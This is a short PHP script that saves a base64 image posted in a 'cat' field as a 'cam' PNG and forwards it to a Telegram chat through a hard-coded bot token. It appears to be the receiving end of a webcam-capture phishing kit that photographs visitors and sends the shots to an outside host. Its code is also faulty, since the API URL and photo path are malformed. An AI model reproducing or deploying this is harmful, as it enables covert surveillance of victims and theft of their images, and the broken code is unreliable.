<?php

$date = date('dMYHis');
$imageData=$_POST['cat'];


$filteredData=substr($imageData, strpos($imageData, ",")+1);
$unencodedData=base64_decode($filteredData);
$fp = fopen( 'cam'.$date.'.png', 'wb' );
fwrite( $fp, $unencodedData);
fclose( $fp );

file_get_contents("https://api.telegram.org/7151670122:AAHWQikBwVjPtpXIII3UCIuj9m7wp8Vi8iw/sendPhoto?chat_id=1640596676&photo=http://localhost/camt".$fp."&caption=radbon");
exit();
?>